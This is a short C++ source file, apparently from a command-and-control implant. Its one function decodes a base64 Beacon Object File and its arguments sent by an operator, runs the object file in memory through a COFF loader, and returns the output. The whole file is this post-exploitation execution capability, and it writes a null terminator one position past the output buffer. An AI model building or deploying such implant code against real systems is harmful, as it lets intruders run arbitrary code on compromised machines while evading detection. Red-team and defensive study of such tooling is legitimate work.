#include "Command.h"

#include "Coff.h"
#include "Stdlib.h"

BOOL CommandInlineExecute(json& args, string artifact, json& result) {
    PBYTE   Bof           = NULL;
    DWORD   BofSize       = 0;
    PBYTE   BofArgs       = NULL;
    DWORD   BofArgsSize   = 0;


    auto BofArgsb64 = args[0].get<string>(); 
    BofArgs = Base64Decode(BofArgsb64.c_str(), &BofArgsSize);
    if (!BofArgs) {
        return FALSE;
    }

    Bof = Base64Decode(artifact.c_str(), &BofSize);
    if (!Bof) {
        return FALSE;
    }

    if (!COFFLoader(TRUE, Bof, BofSize, BofArgs, BofArgsSize)) {
        return FALSE;
    }
    
    INT     OutputSize      = 0;
    PCHAR   Output          = BeaconGetOutputData(&OutputSize);
    Output[OutputSize]      = '\0';
    result["output"] = Output;

    free(Output);
    return TRUE;
}